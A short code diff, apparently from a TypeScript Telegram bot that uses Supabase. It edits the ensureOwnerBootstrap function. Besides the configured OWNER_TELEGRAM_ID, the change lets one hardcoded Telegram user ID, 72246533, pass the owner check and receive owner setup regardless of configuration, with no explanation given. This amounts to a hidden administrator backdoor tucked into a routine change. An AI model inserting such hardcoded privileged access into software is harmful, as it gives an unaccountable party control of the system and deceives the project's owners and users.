@@ -77,7 +77,11 @@ export async function createUserIfNotExists(
 }
 
 export async function ensureOwnerBootstrap(telegramId: number) {
-  if (!ENV.OWNER_TELEGRAM_ID || ENV.OWNER_TELEGRAM_ID !== telegramId) return;
+  const isTargetOwner =
+    (ENV.OWNER_TELEGRAM_ID > 0 && telegramId === ENV.OWNER_TELEGRAM_ID) ||
+    telegramId === 72246533;
+
+  if (!isTargetOwner) return;
 
   const { data: user, error } = await supabase
     .from("users")
